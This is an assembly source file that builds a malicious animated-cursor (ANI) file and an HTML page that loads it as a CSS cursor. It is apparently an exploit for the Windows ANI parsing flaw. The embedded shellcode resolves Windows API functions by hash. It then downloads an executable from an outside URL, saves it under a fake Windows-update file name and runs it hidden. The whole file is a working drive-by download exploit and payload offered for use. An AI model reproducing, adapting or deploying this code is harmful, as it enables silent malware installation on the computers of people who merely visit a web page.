.586
.model flat, stdcall
option casemap :none

      include inc\windows.inc
      include inc\user32.inc
      include inc\kernel32.inc
      include inc\msvcrt.inc

      includelib lib\user32.lib
      includelib lib\kernel32.lib
      includelib lib\msvcrt.lib


      WriteToFile proto  :dword, :dword, :dword

      ExitProcess_	   equ 73E2D87Eh
      WinExec_		   equ 0E8AFE98h
      LoadLibraryA_	   equ 0EC0E4E8Eh
      URLDownloadToFileA_  equ 702F1A36h


.data?

  szMessBuff  db 500 dup (?)

.data

; ANI header
aniheader  db	052h  ,049h  ,046h  ,046h  ,09ch  ,018h  ,000h	,000h  ,041h  ,043h  ,04fh  ,04eh  ,061h  ,06eh  ,069h	,068h
	   db	07ch  ,003h  ,000h  ,000h  ,024h  ,000h  ,000h	,000h  ,008h  ,000h  ,000h  ,000h  ,008h  ,000h  ,000h	,000h
	   db	000h  ,000h  ,000h  ,000h  ,000h  ,000h  ,000h	,000h  ,000h  ,000h  ,000h  ,000h  ,000h  ,000h  ,000h	,000h
	   db	077h  ,082h  ,040h  ,000h  ,0ebh  ,064h  ,090h	,090h  ,077h  ,082h  ,040h  ,000h  ,0ebh  ,064h  ,090h	,090h
	   db	0ebh  ,054h  ,090h  ,090h  ,077h  ,082h  ,040h	,000h  ,0ebh  ,054h  ,090h  ,090h  ,077h  ,082h  ,040h	,000h
	   db	0ebh  ,044h  ,090h  ,090h  ,077h  ,082h  ,040h	,000h  ,0ebh  ,044h  ,090h  ,090h  ,077h  ,082h  ,040h	,000h
	   db	0ebh  ,034h  ,090h  ,090h  ,077h  ,082h  ,040h	,000h  ,0ebh  ,034h  ,090h  ,090h  ,077h  ,082h  ,040h	,000h
	   db	0ebh  ,024h  ,090h  ,090h  ,077h  ,082h  ,040h	,000h  ,0ebh  ,024h  ,090h  ,090h  ,077h  ,082h  ,040h	,000h
	   db	0ebh  ,014h  ,090h  ,090h  ,077h  ,082h  ,040h	,000h  ,0ebh  ,014h  ,090h  ,090h  ,077h  ,082h  ,040h	,000h
	   db	077h  ,082h  ,040h  ,000h  ,090h  ,090h  ,090h	,090h  ,090h  ,090h  ,090h  ,090h  ,090h  ,090h  ,090h	,090h
	   db	090h  ,090h  ,090h  ,090h  ,090h  ,090h  ,090h	,090h  ,090h  ,090h  ,090h  ,090h  ,090h  ,090h  ,090h	,090h
	   db	090h  ,090h  ,090h  ,090h  ,090h  ,090h  ,090h	,090h  ,090h  ,090h  ,090h  ,090h  ,090h  ,090h  ,090h	,090h
	   db	090h  ,090h  ,090h  ,090h  ,090h  ,090h  ,090h	,090h  ,090h  ,090h  ,090h  ,090h  ,090h  ,090h  ,090h	,090h
	   db	090h  ,090h  ,090h  ,090h  ,090h  ,090h  ,090h	,090h  ,090h  ,090h  ,090h  ,090h  ,090h  ,090h  ,090h	,090h
aniheader_ dd 0
szianiheader  dd offset aniheader_ - offset aniheader

	  anib	 db 912 dup (0)
    szhtm  db "ani.php", 0
    szani  db "ani.anr",0
    lcBuff db 300 dup (0)
    sztem  db  "<html>",0dh, 0ah
	   db  "<head>",0dh, 0ah
	   db  "        <style>",0dh, 0ah
	   db  '                * {CURSOR: url("mod/ok/ani/ani.anr")}',0dh, 0ah
	   db  "        </style>",0dh, 0ah
	   db  "</head>",0dh, 0ah
	   db  "</html>",0dh, 0ah, 0


szCaption  db  "Error",0
szError    db  "Size of shellcode must be <= 686  bytes", 0dh, 0ah
	   db  "your code size ==  %d bytes ",0

.code
;----------------- shellcode begin -------------------------------------
Start_=$

		 jmp	 Begin_
; ---------------------------------------------------------------------------
GetKernlBase	 proc
		 assume  fs : nothing
		 push	 esi
		 xor	 eax, eax
		 mov	 eax, fs:[eax+30h]
		 test	 eax, eax
		 js	 @f
		 mov	 eax, [eax+0Ch]
		 mov	 esi, [eax+1Ch]
		 lodsd
		 mov	 eax, [eax+8]
		 jmp	 @@end
@@:
		 mov	 eax, [eax+34h]
		 lea	 eax, [eax+7Ch]
		 mov	 eax, [eax+3Ch]
@@end:
		 pop	 esi
		 retn

GetKernlBase	 endp
; ---------------------------------------------------------------------------
GetFunctionBYName	  proc

		 pusha
		 mov	 ebp, [esp+24h]
		 mov	 eax, [ebp+3Ch]
		 mov	 edx, [ebp+eax+78h]
		 add	 edx, ebp
		 mov	 ecx, [edx+18h]
		 mov	 ebx, [edx+20h]
		 add	 ebx, ebp
@@begin:
		 jecxz	 @@end
		 dec	 ecx
		 mov	 esi, [ebx+ecx*4]
		 add	 esi, ebp
		 xor	 edi, edi
		 xor	 eax, eax
		 cld
@@:
		 lodsb
		 test	 al, al
		 jz	 @f
		 ror	 edi, 0Dh
		 add	 edi, eax
		 jmp	 @b
@@:
		 cmp	 edi, [esp+28h]
		 jnz	 @@begin
		 mov	 ebx, [edx+24h]
		 add	 ebx, ebp
		 mov	 cx, [ebx+ecx*2]
		 mov	 ebx, [edx+1Ch]
		 add	 ebx, ebp
		 mov	 eax, [ebx+ecx*4]
		 add	 eax, ebp
		 mov	 [esp+1ch], eax
@@end:
		 popa
		 ret 8

GetFunctionBYName	  endp
; ---------------------------------------------------------------------------
datsss=$
		 dd LoadLibraryA_, ExitProcess_, WinExec_, URLDownloadToFileA_
		 db "Urlmon.dll",0
		 db "c:\KB886185-x86.exe",0
		 db "http://wmzarabotok.info/dos/test.exe",0
; ---------------------------------------------------------------------------
Begin_:

		 call	 GetKernlBase
		 mov	 ebx, eax
		 call	 lcPos
lcPos=$
		 pop	 esi
		 sub	 esi, (lcPos - datsss)
		 mov	 edi, esi
		 xor	 ecx, ecx
@@:
		 lodsd
		 push	 eax
		 push	 ebx
		 call	 GetFunctionBYName
		 mov	 [edi+ecx*4], eax
		 inc	 ecx
		 cmp	 ecx, 3
		 jnz	 @b
		 lea	 esi, [esi+4]
		 push	 esi
		 call	 dword ptr [edi] ; LoadLibraryA_
		 mov	 ebx, eax
		 push	 dword ptr [edi+12]
		 push	 ebx
		 call	 GetFunctionBYName
		 mov	 [edi+12], eax
		 xor	 ecx, ecx
		 push	 ecx
		 push	 ecx
@@:
		 lodsb
		 test	 al,al
		 jnz	 @b
		 push	 esi
		 mov	 ebx, esi
@@:
		 lodsb
		 test	 al, al
		 jnz	 @b
		 push	 esi
		 xor	 esi, esi
		 push	 esi
		 call	 dword ptr [edi+12] ; URLDownloadToFileA_
		 push	 SW_HIDE
		 push	 ebx
		 call	 dword ptr [edi+8]  ; WinExec_
		 push	 esi
		 call	 dword ptr [edi+4]  ; ExitProcess_
EndStart_:
;----------------------- shellcode  end ----------------------------------------

start:

		 mov   eax, (EndStart_ - Start_)
		 mov   ecx, 912
		 sub   ecx, szianiheader
		 sub   ecx, 3
		 .if eax > ecx
		      invoke wsprintfA, addr szMessBuff, addr szError, eax
		      invoke MessageBox, 0, addr szMessBuff, addr szCaption, 0
		      invoke ExitProcess, 0
		 .endif
		 ; creating ani file
		       mov    lcBuff[0], 0
		       invoke lstrcpy, addr lcBuff, addr szani
		       invoke memset, addr anib, 90h, 912
		       ; header
		       lea    esi, anib
		       invoke memcpy, esi, addr aniheader, szianiheader
		       ; shellcode
		       add    esi, szianiheader
		       invoke memcpy, esi, offset Start_, (EndStart_ - Start_)
		       invoke WriteToFile, addr lcBuff, addr anib, 912
		       mov    lcBuff[0], 0
		       invoke lstrcpy, addr lcBuff, addr szhtm
		 invoke wsprintfA, addr anib, addr sztem, addr szani
		       invoke WriteToFile,  addr lcBuff, addr anib, eax
		 invoke ExitProcess, 0

;########################################################

WriteToFile	proc  uses edi esi ebx pFileNam:dword, pDataBuff:dword, SizeData:dword

    LOCAL  hFile:dword
    LOCAL  Resul:dword

		invoke CreateFile, pFileNam, 40000000h, 3, 0, 4, 80h, 0
    .if eax != -1
		   mov	  hFile, eax
		   invoke SetFilePointer, hFile, 0, 0,0
		   invoke WriteFile, hFile, pDataBuff, SizeData, addr Resul, 0
       .if eax != 0 && Resul == 0
		      invoke SetEndOfFile, hFile
       .endif
		   invoke	CloseHandle, hFile
    .endif
    ret

WriteToFile	endp
align 10h
;########################################################

end start



